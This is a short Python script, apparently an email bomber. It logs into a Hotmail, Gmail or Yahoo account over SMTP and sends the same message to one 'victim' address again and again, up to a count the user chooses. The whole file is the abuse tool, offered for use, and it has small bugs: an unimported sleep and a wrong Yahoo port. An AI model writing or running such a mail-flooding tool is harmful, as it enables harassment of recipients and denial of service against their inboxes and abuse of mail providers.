import smtplib
import os
import sys
import threading

def connect(server,mail, passw):
    global svr
    if server == "hotmail":
         svr = smtplib.SMTP('smtp.live.com:587')
    elif server == "gmail":
         svr = smtplib.SMTP('smtp.gmail.com:587')
    elif server == "yahoo":
         svr = smtplib.SMTP('smtp.mail.yahoo.com:995')
    else:
        return "Error: no smtp chosen"
    svr.starttls()
    svr.login(mail, passw)
    
class mailer(threading.Thread):
    def __init__(self,mail,msg,maxmails,victim):
        self.mail = mail
        self.msg = msg
        self.maxmails = maxmails
        self.victim = victim
        threading.Thread.__init__(self)
    def run(self):
        percent = 0
        i = 0
        while(percent != 100):
            svr.sendmail(self.mail,self.victim,self.msg)
            percent = 100 / int(self.maxmails) * i
            print(str(percent) + " %");
            i += 1
        print("Done!")
        svr.quit()
        return "Succesfull"
    

print("""
Mailer
------
------
""")

server = input("type hotmail for hotmail account or type gmail for gmail account:")
mail = input("type in your mail address here: ")
passw= input("type in your password here: ")
maxmails = input("type here the number of mails you want to send: ")
receiver = input("type here your receiver: ")
msg = input("type in the message here: ")
connect(server, mail, passw)

try:
    t = mailer(mail,msg,maxmails,receiver)
    t.start()
    t.join()
except:
  os.system("clear")
  print("Seems like we have a problem here, contact me so i can fix this bug!")
  sleep(5000);
